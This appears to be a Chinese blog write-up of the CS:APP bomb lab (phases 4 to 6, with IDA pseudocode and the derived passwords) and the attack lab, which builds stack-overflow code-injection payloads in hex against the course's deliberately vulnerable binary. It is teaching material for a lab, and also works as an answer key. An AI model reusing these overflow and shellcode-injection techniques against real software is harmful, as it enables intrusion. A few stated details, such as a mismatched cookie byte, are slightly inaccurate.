<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">phase_4</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)__isoc99_sscanf(a1, <span class="string">"%d %d"</span>, &amp;v2, &amp;v3) != <span class="number">2</span> || v2 &gt; <span class="number">0xE</span> )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  result = func4(v2, <span class="number">0L</span>L, <span class="number">14L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result || v3 )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>func4 :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">func4</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = ((<span class="keyword">signed</span> <span class="keyword">int</span>)a3 - (<span class="keyword">signed</span> <span class="keyword">int</span>)a2) / <span class="number">2</span> + a2;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; (<span class="keyword">signed</span> <span class="keyword">int</span>)a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * (<span class="keyword">unsigned</span> <span class="keyword">int</span>)func4(a1, a2, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v3 - <span class="number">1</span>));</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)a1 )</span><br><span class="line">    result = <span class="number">2</span> * (<span class="keyword">unsigned</span> <span class="keyword">int</span>)func4(a1, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v3 + <span class="number">1</span>), a3) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析代码可知, 最简单的一种情况就是 fun4 中的两个if分支都不要进入(不然会进入递归), 那么也就是需要 <code>v3 = a1</code>, 即<code>a1 = ((signed int)a3 - (signed int)a2) / 2 + a2</code>, 其中 a1 为输入的第一个数, a2=0, a3=14. 计算得出a1 = 7.<br>且由 phase_4 中的代码, 输入的第二个数(v3)一定是0.<br>那么一组答案就是 7 0.</p>
<p>但是刚才并没有考虑进入递归的情况, 如果考虑递归, 可以把这段代码写成C语言的程序, 将第一个输入从0 到 14遍历. </p>
<h4 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h4><p>ida 伪代码:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">phase_5</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">6</span>]; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+16h] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)string_length((_BYTE *)a1) != <span class="number">6</span> )</span><br><span class="line">    explode_bomb(a1);</span><br><span class="line">  v1 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3[v1] = array_3449[*(_BYTE *)(a1 + v1) &amp; <span class="number">0xF</span>];</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 != <span class="number">6</span> );</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)strings_not_equal(v3, <span class="string">"flyers"</span>) )</span><br><span class="line">    explode_bomb(v3);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由代码和使用调试器分析可知, 每次我们输入的字符串<code>input</code>的各位会被取出来和<code>0xF</code>相与, 结果会被作为字符串<code>source = &quot; aduiersnfotvbyl&quot;</code>的下标<code>index = input[i]&amp;0xF</code>. <strong>注意source的第一个字符为空格.</strong><br>再根据此下标<code>index</code>取出字符串中的相应字符<code>source[index]</code>保存于另一个字符串<code>result</code>中, 只有最后<code>result = &quot;flyers&quot;</code>才算成功. </p>
<p>用下面的表可以得出 password.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">source:</span><br><span class="line">  a d u i e r s n f   o   t   v   b   y   l</span><br><span class="line"></span><br><span class="line">0 1 2 3 4 5 6 7 8 9  10  11  12  13  14  15</span><br><span class="line"></span><br><span class="line">0x0     .......     0xa 0xb 0xc 0xd 0xe 0xf </span><br><span class="line"></span><br><span class="line">target:</span><br><span class="line">   f    l    y    e    r    s</span><br><span class="line"></span><br><span class="line">   9   15   14    5    6    7</span><br><span class="line"></span><br><span class="line">0x39 0x3f 0x3e 0x35 0x36 0x37</span><br><span class="line"></span><br><span class="line">password:</span><br><span class="line">   9    ?    &gt;    5    6    7</span><br></pre></td></tr></table></figure>

<h4 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h4><p>仍然用 IDA 生成了伪代码</p>
<ul>
<li>第一部分:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">v1 = &amp;v15;</span><br><span class="line">  read_six_numbers(a1, &amp;v15);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(*(_DWORD *)v1 - <span class="number">1</span>) &gt; <span class="number">5</span> )</span><br><span class="line">      explode_bomb(a1, &amp;v15);</span><br><span class="line">    <span class="keyword">if</span> ( ++v2 == <span class="number">6</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = v2;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)v1 == *((_DWORD *)&amp;v15 + v3) )</span><br><span class="line">        explode_bomb(a1, &amp;v15);</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt;= <span class="number">5</span> );</span><br><span class="line">    v1 = (__int64 *)((<span class="keyword">char</span> *)v1 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>根据之前的经验, 这里是读了6个数字 , 每个数字必须小于7. 并且通过循环遍历, 确保了两两之间都不相同. </p>
<ul>
<li>第二部分:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v4 = &amp;v15;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v4 = <span class="number">7</span> - *(_DWORD *)v4;</span><br><span class="line">    v4 = (__int64 *)((<span class="keyword">char</span> *)v4 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 != &amp;v16 );</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这里把我们输入的每个数都改为了 7 与此数的差.</p>
<ul>
<li>第三部分:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = *(_DWORD *)((<span class="keyword">char</span> *)&amp;v15 + v5);</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = &amp;node1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">1</span>;</span><br><span class="line">      v6 = &amp;node1;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = (_QWORD *)v6[<span class="number">1</span>];</span><br><span class="line">        ++v7;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 != v8 );</span><br><span class="line">    &#125;</span><br><span class="line">    *(__int64 *)((<span class="keyword">char</span> *)&amp;v17 + <span class="number">2</span> * v5) = (__int64)v6;</span><br><span class="line">    v5 += <span class="number">4L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5 != <span class="number">24</span> );</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这里有个变量名为 node.<br>通过在调试器中分析, 弄清楚了其本质是结构体, 推测定义为:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调试器中内存的值:</p>
<figure class="image-box">
                <a rel=一些有趣的实验 href="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/7.png" title="" data-fancybox="images"><img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/7.png" alt title class></a>
                <p></p>
            </figure>

<p>所以这部分代码会通过我们输入的序号取出对应的node并依次排列.</p>
<ul>
<li>第四部分:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">while</span> ( v5 != <span class="number">24</span> );</span><br><span class="line">  v9 = v17;</span><br><span class="line">  v10 = &amp;v18;</span><br><span class="line">  <span class="keyword">for</span> ( i = v17; ; i = v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = *v10;</span><br><span class="line">    *(_QWORD *)(i + <span class="number">8</span>) = *v10;</span><br><span class="line">    ++v10;</span><br><span class="line">    <span class="keyword">if</span> ( v10 == &amp;v19 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这部分代码应该是把新排列的 node 的指针相连接. 不过对后面的题目影响似乎不是很大.</p>
<ul>
<li>第五部分:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*(_QWORD *)(v12 + <span class="number">8</span>) = <span class="number">0L</span>L;</span><br><span class="line">  v13 = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = **(<span class="keyword">unsigned</span> <span class="keyword">int</span> **)(v9 + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v9 &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)result )</span><br><span class="line">      explode_bomb(a1, &amp;v19);</span><br><span class="line">    v9 = *(_QWORD *)(v9 + <span class="number">8</span>);</span><br><span class="line">    --v13;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v13 );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这里把六个新排好序的节点按内存中相邻的顺序检查是否前一个的value大于后一个, 如果不是就会爆炸. </p>
<p>这六个的值分别是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node1 node2 node3 node4 node5 node6</span><br><span class="line">0x14c 0x0a8 0x39c 0x2b3 0x1dd 0x1bb</span><br></pre></td></tr></table></figure>

<p>排序后就是<code>3 4 5 6 1 2</code></p>
<p>加上之前那 “7 减”的操作, 就成了<code>4 3 2 1 6 5</code>, 即为 password.</p>
<h3 id="attack-lab"><a href="#attack-lab" class="headerlink" title="attack lab"></a>attack lab</h3><p>进行三次代码注入攻击!</p>
<h4 id="任务一"><a href="#任务一" class="headerlink" title="任务一"></a>任务一</h4><p>目标: 通过<code>gets()</code>函数的栈溢出漏洞, 利用输入的字符串覆盖栈外的 <code>retaddr</code> 为某个地址, 使程序运行一段通常情况下不会执行的代码, 也就是<code>retaddr</code>所保存的新的地址值处的代码.  </p>
<p>使用调试器, 查看反编译的汇编代码, 发现<code>sub    $0x28,%rsp</code>可知栈的大小.</p>
<p>如果用 IDA 查看栈的结构. <code>getbuf()</code>函数的反汇编伪代码为:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  Gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有个小细节, <code>char bur[]</code>后面标注的是<code>[rsp+0h] [rbp-28h]</code>这个内存范围. 也就是这片函数栈帧的2*16+8=40字节大小. 然而下标处却写的是32(字节). 还有8 byte 存放的是原先的 ebp 的值.</p>
<p>此处的函数栈结构应为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">               +-----------------+</span><br><span class="line">               |     retaddr     |</span><br><span class="line">               +-----------------+</span><br><span class="line">               |    saved ebp    |</span><br><span class="line">        rbp -&gt; +-----------------+</span><br><span class="line">               |    buf[24:32]   |</span><br><span class="line">               |    buf[16:24]   |</span><br><span class="line">               |    buf[8:16]    |</span><br><span class="line">               |    buf[0:8]     |</span><br><span class="line">rbp-32, rsp -&gt; +-----------------+</span><br></pre></td></tr></table></figure>

<p>如果要让数据溢出到<code>retaddr</code>, 需要构造<code>payload = &#39;a&#39;*32 + &#39;b&#39;*8 + targetaddr</code>. </p>
<p>再查看下<code>touch1</code>的函数地址, 为<code>0x00 00 00 00 00 40 17 C0</code>. 考虑到大端序到小端序的转换应为<code>0x00 00 00 00 c0 17 40 00</code>. </p>
<p>用<code>hex2raw</code>工具进行不可见字符的输入, 构造文本文件例如:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/*       &apos;a&apos;*32       */</span><br><span class="line">31 31 31 31  31 31 31 31 </span><br><span class="line">31 31 31 31  31 31 31 31</span><br><span class="line">31 31 31 31  31 31 31 31</span><br><span class="line">31 31 31 31  31 31 31 31</span><br><span class="line">/*       &apos;b&apos;*8        */</span><br><span class="line">65 65 65 65  65 65 65 65</span><br><span class="line">/*   target address   */</span><br><span class="line">c0 17 40 00  00 00 00 00</span><br><span class="line">/*        \n          */</span><br><span class="line">0a</span><br></pre></td></tr></table></figure>

<p>跑一下, 没有问题.</p>
<figure class="image-box">
                <a rel=一些有趣的实验 href="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/attack_lab/%24R%25S7Z%7BRVOR0MUSD0CHE8%40T.png" title="" data-fancybox="images"><img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/attack_lab/%24R%25S7Z%7BRVOR0MUSD0CHE8%40T.png" alt title class></a>
                <p></p>
            </figure>
<h4 id="任务二"><a href="#任务二" class="headerlink" title="任务二"></a>任务二</h4><p>这个任务需要在调用touch2后进入if为真的分支中, 这需要满足条件<code>val==cookie</code>.</p>
<p>根据指导书中的提示, val作为调用函数的参数, 它的值是被保存在寄存器<code>$rdi</code>中的. 也就是在实现地址跳转到<code>touch2</code>的同时还要想办法修改寄存器的值. </p>
<p>成功的流程应该为 : </p>
<ol>
<li>在<code>getbuf()</code>中栈溢出.</li>
<li>设置<code>$rdi</code>的值为cookie.</li>
<li>跳转到<code>touch2()</code></li>
<li>进入<code>if(true)</code>, 调用<code>validate()</code></li>
</ol>
<p>所以关键就是如何栈溢出后能设置寄存器的值, 并且再跳转到<code>touch2()</code></p>
<p>解决的方法是注入指令代码: 通过把ret的地址值覆盖为栈顶的指针(也就是我们字符串的首地址), 能够让字符串(的二进制对应机器码)作为指令运行起来.</p>
<p>通过注入指令修改寄存器<code>$rdi</code>的值很容易实现, 只要一个mov指令就可以了. 那么如何通过指令跳转到目标的地址呢? 为了这个疑问, 我又在书上和网上查找了很多资料, 最后搞清楚了这个问题. 在普通的函数调用执行<code>call指令</code>时, 程序会记录下call的下一条指令的地址来使将来能返回到正确的地址. 不过这一步并非是编译器来完成, 而是CPU负责的, CPU在执行ret时, 会将<code>$ip(程序计数器)</code>的值压入栈中, 也就形成了如图的<code>retaddr</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">               +-----------------+</span><br><span class="line">               |     retaddr     |</span><br><span class="line">               +-----------------+</span><br><span class="line">               |    saved ebp    |</span><br><span class="line">        rbp -&gt; +-----------------+</span><br><span class="line">               |    buf[24:32]   |</span><br><span class="line">               |    buf[16:24]   |</span><br><span class="line">               |    buf[8:16]    |</span><br><span class="line">               |    buf[0:8]     |</span><br><span class="line">rbp-32, rsp -&gt; +-----------------+</span><br></pre></td></tr></table></figure>

<p>当CPU执行<code>ret</code>前, 编译器会先执行<code>sub %rsp</code>, 也就是将<code>$rsp</code>的值设为<code>retaddr</code>这部分内存的地址, 再执行<code>ret</code>, CPU会将<code>rsp</code>中的值赋给寄存器<code>$ip</code>, 这样程序的指令就会从调用前的位置继续执行. 换言之, 如果执行<code>ret</code>指令时<code>$rsp</code>所指向的位置的值不是一个有效的指令地址, 那么程序一定会出错的. </p>
<p>言归正传, 理解了这些就好办了. 只要先push一下, 让<code>$rsp</code>再向下移动一个单位,同时向此处写入要跳转的地址, 然后ret就可以实现了, 先写出汇编语言 : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq    $0x59b997fa, %rdi</span><br><span class="line">pushq   0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>使用gcc将这几行代码编译为机器指令后再用 <code>objdump</code> 反汇编出字节码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:   48 c7 c7 fa 97 69 59    mov    $0x596997fa,%rdi</span><br><span class="line">7:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">c:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>把这段字节码写入 payload 中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/* 指令 */</span><br><span class="line">48 c7 c7 fa 97 b9 59</span><br><span class="line">68 ec 17 40 00 </span><br><span class="line">c3 </span><br><span class="line">31 31 31 </span><br><span class="line">/* 占位 */</span><br><span class="line">31 31 31 31</span><br><span class="line">31 31 31 31</span><br><span class="line">31 31 31 31</span><br><span class="line">31 31 31 31</span><br><span class="line"></span><br><span class="line">65 65 65 65</span><br><span class="line">65 65 65 65 </span><br><span class="line">/* 栈顶 */</span><br><span class="line">78 dc 61 55 </span><br><span class="line">00 00 00 00</span><br><span class="line">0a</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <a rel=一些有趣的实验 href="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/attack_lab/%5DCQ%60UP2NYY%25%602U%29R8~Z5WMF.png" title="" data-fancybox="images"><img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/attack_lab/%5DCQ%60UP2NYY%25%602U%29R8~Z5WMF.png" alt title class></a>
                <p></p>
            </figure>
<ul>
<li>一开始的错误思路 :<ul>
<li>企图尝试直接插入能修改rip寄存器的代码实现跳转, 不成.</li>
<li>误认为 ret 每次都会将同一内存地址的值赋值给$rip, 事实上因为pop弹出的是栈顶的值, 所以并非同一地址.</li>
</ul>
</li>
</ul>
<h4 id="任务三"><a href="#任务三" class="headerlink" title="任务三"></a>任务三</h4><p>首先要先明确思路. 这个任务应该通过栈溢出进入touch3并且进入validate(3)所在的if分支. 这也必须满足条件<code>hexmatch(cookie, sval)</code>为真. sval是调用touch3时传入的参数, 变量类型是char指针. 这里可以通过类似任务二中的方法来修改这个指针保存的地址到我们注入的payload字符串所在的地址. 但是问题的关键在于, 当进入<code>touch3</code>后, 程序调用了<code>hexmatch()</code>这个函数. 由于在进入<code>validate</code>前<code>getbuf</code>函数已经完成了退栈操作, 那么<code>hexmatch()</code>这个函数的帧栈一定会把之前<code>getbuf</code>函数帧栈所在的地址覆盖掉, 因为<code>char cbuf[110]</code>申请了110个字节的大小, 更不用说之后还有<code>sprintf</code>和<code>strncmp</code>这两个函数. 那么这样就会被把我们注入的字符串的值破坏掉, 就算把 sval 的指针指向这里也没用. 所以成功的关键在于把这个字符串保存在安全的地址中. 由栈的结构可知, 后来调用的函数必然不会覆盖调用者的地址, 所以<code>getbuf</code>之前的地址绝对是安全的, 且通过溢出能被我们修改. 也就是说, 这次的构造的注入的字符串还需要更长一些, 溢出到<code>test</code>函数中.</p>
<p>除此之外, 还应该构造出能满足分支条件的字符串. <code>hexmatch(unsigned val, char *sval)</code>的作用于在其中调用的<code>sprintf(s, &quot;%.8x&quot;, val)</code>和<code>strncmp(sval, s ,9)</code>这两个函数有关. 前一个函数在这里的作用是将参数<code>val</code>格式化为字符串并且保存在 s 中, <code>%.8x</code>指明了val是一个八位的16进制数. 而<code>strncmp(sval, s ,9)</code>顾名思义就是将这两个字符串的前9位进行比较(比8位多一位是要考虑结束符’\0’), 如果相同返回 0. 显然这里为了程序正确执行是需要返回 0 的. 那么构造字符串也简单了, 就根据cookie 的值来翻译成对应字符就行了. 但是在运行程序时因为是从<code>hex2raw</code>中读取, 所以还是需要提前再转为16进制码的.</p>
<p>设置跳转指令的部分和任务二没什么区别, 这样就可以写出汇编代码并且反编译了.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">68 fa 18 40 00          pushq  $0x4018fa</span><br><span class="line">48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi</span><br><span class="line">c3                      retq</span><br></pre></td></tr></table></figure>

<p>构造注入的字符串的十六进制编码.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/* 指令 */</span><br><span class="line">68 fa 18 40 00 48 c7 </span><br><span class="line">c7 a8 dc 61 55</span><br><span class="line">c3 </span><br><span class="line">/* 占位 */</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 </span><br><span class="line">/* 栈顶 */ </span><br><span class="line">78 dc 61 55 00 00 00 00 </span><br><span class="line">/* 存放的字符串 */</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <a rel=一些有趣的实验 href="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/attack_lab/1OS%25NS34C7PJ_%25%7B%253%28WYSOJ.png" title="" data-fancybox="images"><img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/attack_lab/1OS%25NS34C7PJ_%25%7B%253%28WYSOJ.png" alt title class></a>
                <p></p>
            </figure>

<p>运行后成功PASS.</p>

        </div>
        
<blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    最後更新時間：<time datetime="2019-11-02T18:13:53.843Z" itemprop="dateUpdated">2019-11-03 02:13:53</time>
